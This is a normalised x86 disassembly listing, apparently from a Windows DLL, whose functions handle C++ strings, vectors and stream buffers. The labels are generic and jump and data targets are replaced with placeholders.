mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10002579
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_10002033
mov eax esi
pop esi
retn 0x4
sub_100020ec
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x10
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x10
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
add ecx eax
cmp ecx [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_10002143
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_1001b037
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ebx edx
mov ebx [ edx ]
jmp r-xdata
sub eax [ ebp + 0xc ]
add ebx edi
add ebx [ ebp + 0xc ]
push eax
push ebx
sub ecx edi
push ecx
add edx edi
push edx
call sub_10002127
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
add esp 0x10
push eax
mov ecx esi
call sub_10002493
pop ebx
mov edx [ edx ]
cmp ecx 0x10
jb r-xdata
sub_100021b2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_1001b037
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_10002419
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10002143
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10002143
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
add edi edx
push edi
push ecx
push eax
call sub_10002477
add esp 0x10
push esi
mov ecx ebx
call sub_10002493
sub_100022a2
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_10020186
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100201fc
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10023a01
int3
sub_100022ec
push 0xc
mov eax sub_10048a2a
call sub_10023e66
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_100022a2
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
push 0xfffffffe
pop eax
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_100023ce
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_10002493
call sub_10023f0b
retn 0x8
cmp [ edi + 0x18 ] 0x10
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_10002477
add esp 0x10
sub_10002347
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100022a2
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_100023ce
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10002493
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_1002004f
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x10
push eax
call sub_10002477
add esp 0x10
sub_10002419
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xfffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_1001afff
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_100022ec
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_10002493
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_100023ce
jmp r-xdata
mov eax edi
sub_100024af
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_100020ec
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_10002419
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_100021b2
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_10002477
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_10002493
sub_10002597
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0x7
call sub_10002579
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_1002004f
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x8
push eax
call sub_1000255d
add esp 0x10
sub_100025ec
push 0x0
mov eax sub_100492c9
call sub_10023e33
mov esi [ ebp + 0x8 ]
push esi
call sub_1000b385
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
call sub_10001b23
lea ecx [ esi + 0x38 ]
call sub_10007ee2
lea ecx [ esi + 0x54 ]
call sub_10007ee2
lea eax [ esi + 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1000b385
mov eax esi
call sub_10023f0b
retn 0x4
sub_10002634
push esi
lea esi [ edi + 0x70 ]
call sub_10001508
push [ esi ]
call sub_1002004f
pop ecx
xor esi esi
push esi
push 0x1
lea ecx [ edi + 0x54 ]
call sub_100023ce
push esi
push 0x1
lea ecx [ edi + 0x38 ]
call sub_100023ce
push esi
push 0x1
lea ecx [ edi + 0x18 ]
call sub_10002597
mov esi edi
call sub_10001508
push [ edi ]
call sub_1002004f
pop ecx
pop esi
retn
sub_10002679
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a9a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
lea eax [ esp + 0xc ]
push eax
mov edi ecx
call sub_100025ec
and [ esp + 0xa8 ] 0x0
lea eax [ esp + 0xc ]
push eax
call sub_10002725
lea eax [ esp + 0xc ]
call sub_10002a07
lea edi [ esp + 0xc ]
call sub_10002634
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ esp + 0x90 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn
sub_10002725
push 0xb0
mov eax sub_1004a96d
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi r--data
push esi
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x40 ] eax
call sub_100012f3
xor edi edi
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] edi
call sub_100012f3
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1
call sub_10011694
push edi
push 0x1
lea ecx [ ebp - 0x84 ]
call sub_10002597
push edi
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x4
call sub_10002597
push esi
lea ecx [ ebp - 0xa0 ]
call sub_100012f3
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_100117b2
push edi
push 0x1
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x7
call sub_10002597
lea eax [ ebp - 0xbc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_10011c16
mov edx [ ebp - 0x40 ]
mov ecx eax
mov [ ebp - 0x4 ] 0x8
call sub_1000280f
push edi
push 0x1
lea ecx [ ebp - 0xbc ]
call sub_10002597
lea esi [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x4
call sub_10011bce
lea ecx [ ebp - 0x4c ]
call sub_10011795
call sub_10023f1f
retn 0x4
sub_1000280f
push 0x104
mov eax sub_1004a90c
call sub_10023e9c
lea eax [ ebp - 0x110 ]
push eax
mov edi edx
call sub_10002f9e
push 0x7
pop esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] esi
call sub_10002579
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] esi
call sub_10002579
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10006094
pop ecx
pop ecx
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007bdc
mov esi eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007b6c
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x74 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_100061ec
push 0xffffffff
push ebx
push eax
lea ecx [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x3
call sub_100021b2
push ebx
push 0x1
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100023ce
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_10006094
pop ecx
pop ecx
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007bdc
mov esi eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007b6c
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x74 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_100061ec
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0x4
push eax
lea ecx [ edi + 0x54 ]
call sub_100021b2
push ebx
push 0x1
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100023ce
lea eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_10002c5d
lea eax [ edi + 0x18 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_10006094
pop ecx
pop ecx
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x4c ] ebx
call sub_10002b42
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x54 ] esp
push r--data
call sub_100012f3
push [ ebp - 0x4c ]
mov ecx edi
call sub_10002e74
cmp [ ebp - 0x4c ] ebx
mov [ ebp - 0x54 ] ebx
jle r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x4c ] ebx
call sub_10002b42
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x54 ] esp
push r--data
call sub_100012f3
push [ ebp - 0x4c ]
lea esi [ edi + 0x70 ]
mov ecx esi
call sub_10002e74
xor edi edi
cmp [ ebp - 0x4c ] ebx
jle r-xdata
push [ ebp - 0x54 ]
mov esi edi
call sub_10002f12
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_10006094
inc [ ebp - 0x54 ]
mov eax [ ebp - 0x54 ]
cmp eax [ ebp - 0x4c ]
pop ecx
pop ecx
jl r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002597
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002597
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x110 ]
call sub_10002709
call sub_10023f1f
retn
push edi
call sub_10002f12
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_10006094
inc edi
cmp edi [ ebp - 0x4c ]
pop ecx
pop ecx
jl r-xdata
sub_10002a07
push ecx
push ebx
push esi
mov esi eax
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov ebx r--data
lea ecx [ esi + 0x54 ]
push ebx
call sub_10006cf6
test eax eax
je r-xdata
mov [ edi + 0x34 ] eax
lea ecx [ esi + 0x38 ]
push ebx
call sub_10006cf6
test eax eax
je r-xdata
push 0xffffffff
push 0x0
lea eax [ esi + 0x54 ]
push eax
lea ecx [ edi + 0x54 ]
call sub_100021b2
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jbe r-xdata
push 0xffffffff
push 0x0
lea eax [ esi + 0x38 ]
push eax
lea ecx [ edi + 0x38 ]
call sub_100021b2
mov eax [ esi + 0x80 ]
sub eax [ esi + 0x7c ]
add esi 0x70
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jbe r-xdata
mov eax esi
mov ecx edi
call sub_10002d54
pop esi
pop ebx
pop ecx
retn
lea ecx [ edi + 0x70 ]
mov eax esi
call sub_10002d54
sub_10002a92
push 0x68
mov eax sub_1004afe9
call sub_10023e66
mov esi r--data
xor ebx ebx
push esi
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] ebx
call sub_100012f3
push r--data
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x1
call sub_100012f3
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x2
call sub_10011694
push ebx
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_10002597
push ebx
push 0x1
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x5
call sub_10002597
push esi
lea ecx [ ebp - 0x74 ]
call sub_100012f3
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_10011a90
push ebx
cmp al bl
push 0x1
lea ecx [ ebp - 0x74 ]
sete [ ebp - 0x11 ]
mov [ ebp - 0x4 ] 0x5
call sub_10002597
cmp [ ebp - 0x11 ] bl
jne r-xdata
lea ecx [ ebp - 0x20 ]
call sub_10011795
call sub_10023f0b
retn 0x4
mov ecx [ ebp + 0x8 ]
call sub_10002679
sub_10002b42
push 0x2c
mov eax sub_1004a8c6
call sub_10023e66
mov esi [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_10007a87
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ esi ]
mov [ ebp - 0x1c ] ebx
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100062b7
pop ecx
lea ecx [ ebp - 0x20 ]
mov edi eax
call sub_10007b41
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
cmp ecx ebx
lea ebx [ ebp - 0x1c ]
push ebx
lea ebx [ ebp - 0x18 ]
push ebx
push eax
sete dl
mov [ ebp - 0x2c ] 0x1
push [ ebp - 0x2c ]
xor eax eax
push eax
mov [ ebp - 0x34 ] dl
push [ ebp - 0x34 ]
mov edx [ edi ]
push ecx
lea eax [ ebp - 0x38 ]
push eax
mov ecx edi
call [ edx + 0x20 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp sub_10002c03
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x18 ]
call sub_10007e2d
mov eax esi
call sub_10023f0b
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_1001b0ae
sub_10002bd3
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10002c03
test [ ebp - 0x18 ] 0x2
jne r-xdata
or [ ebp - 0x18 ] 0x2
mov eax [ ebp - 0x1c ]
lea ecx [ eax - 0x80000000 ]
cmp ecx 0xffffffff
ja r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x18 ]
call sub_10007e2d
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
jmp r-xdata
mov eax esi
call sub_10023f0b
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_1001b0ae
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
sub_10002c5d
push 0x24
mov eax sub_1004a89b
call sub_10023e66
mov esi [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_10007a87
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100062b7
pop ecx
lea ecx [ ebp - 0x18 ]
mov edi eax
call sub_10007b41
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
cmp ecx ebx
lea ebx [ ebp - 0x14 ]
push ebx
push eax
sete dl
mov [ ebp - 0x24 ] 0x1
push [ ebp - 0x24 ]
xor eax eax
push eax
mov [ ebp - 0x2c ] dl
push [ ebp - 0x2c ]
mov edx [ edi ]
push ecx
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call [ edx + 0x24 ]
and [ ebp - 0x4 ] 0x0
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
push 0x0
push [ ebp - 0x14 ]
call sub_10007e2d
mov eax esi
call sub_10023f0b
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_1001b0ae
sub_10002ce9
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10002d54
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov esi eax
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ edi + 0xc ]
sub eax ebx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx eax
cmp [ ebp - 0x4 ] ecx
ja r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x8 ]
call sub_10001909
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10001909
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push eax
push edi
call sub_10003661
jmp r-xdata
test ebx ebx
jne r-xdata
push [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
mov eax ebx
call sub_10006354
pop ecx
push [ edi + 0x10 ]
call sub_100015d1
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
imul eax eax 0x1c
add eax [ edi + 0xc ]
jmp r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
push 0x1c
cdq
pop ebx
idiv ebx
xor eax eax
jmp r-xdata
mov [ edi + 0x10 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
imul ecx ecx 0x1c
add ecx edx
mov ebx ecx
push ebx
mov ecx edx
call sub_10006354
pop ecx
push [ edi + 0x10 ]
mov ecx ebx
jmp r-xdata
cmp [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
ja r-xdata
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
xor ecx ecx
mov [ edi + 0xc ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] ecx
cmp eax ecx
je r-xdata
push [ edi + 0x10 ]
call sub_100015d1
push [ edi + 0xc ]
call sub_1002004f
pop ecx
push [ esi + 0x10 ]
call sub_10006392
call sub_100014df
test al al
je r-xdata
push [ edi + 0xc ]
mov ecx [ esi + 0xc ]
sub_10002e74
push 0x1c
mov eax sub_10049e2e
call sub_10023e33
mov edi ecx
and [ ebp - 0x4 ] 0x0
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax [ edi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp + 0x8 ] eax
jbe r-xdata
jae r-xdata
lea esi [ ebp - 0x18 ]
call sub_10001909
push [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
push [ ebp - 0x18 ]
push eax
mov eax [ edi + 0x10 ]
sub eax [ edi + 0xc ]
push 0x1c
pop ecx
cdq
idiv ecx
mov ecx [ ebp + 0x8 ]
sub ecx eax
push ecx
mov ecx edi
call sub_100015ee
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_10002597
call sub_10023f0b
retn 0x20
lea esi [ ebp - 0x18 ]
call sub_10001909
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x20 ]
call sub_10001909
push [ ebp + 0x8 ]
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x20 ]
call sub_10001929
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push eax
push edi
call sub_10003661
sub_10002f12
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ esp + 0x4 ] eax
jb r-xdata
mov eax [ esp + 0x4 ]
imul eax eax 0x1c
add eax [ esi + 0xc ]
retn 0x4
call sub_1002059f
sub_10002f36
push 0x8
mov eax sub_1004a13a
call sub_10023e33
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
xor ebx ebx
push edi
inc ebx
push esi
mov [ ebp - 0x10 ] ebx
call sub_100036b9
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_100047a8
and [ edi + 0x3c ] 0x0
and [ edi + 0x40 ] 0x0
mov [ edi ] r--data
mov eax esi
call sub_10023f0b
retn 0x4
sub_10002f9e
push 0x8
mov eax sub_1004a13a
call sub_10023e33
mov ebx ecx
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0xc ]
xor esi esi
push eax
inc esi
push edi
mov [ ebp - 0x10 ] esi
call sub_100036b9
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
lea esi [ edi + 0xc ]
push esi
mov [ edi + eax ] r--data
mov [ ebp - 0x14 ] esi
call sub_100047a8
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x18 ] 0x8
mov eax [ ebx + 0x14 ]
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
mov eax edi
call sub_10023f0b
retn 0x4
push ebx
call sub_10004879
and [ esi + 0x3c ] 0x0
and [ esi + 0x40 ] 0x0
test eax eax
je r-xdata
sub_1000302d
push 0x4
mov eax sub_100489c0
call sub_10023e33
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_100030a6
mov ecx esi
call sub_1000307b
call sub_10023f0b
retn
sub_100030a6
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_10007284
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_1002004f
pop ecx
sub_100030ef
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov bx [ ebp + 0x8 ]
mov eax 0xffff
cmp ax bx
jne r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp eax edx
jae r-xdata
test [ esi + 0x40 ] 0x2
je r-xdata
mov ecx [ esi + 0x34 ]
mov eax [ ecx ]
mov edx edi
lea eax [ edx + eax * 2 ]
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
test edi edi
jne r-xdata
mov eax 0xffff
jmp r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov [ ecx ] bx
mov ax bx
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
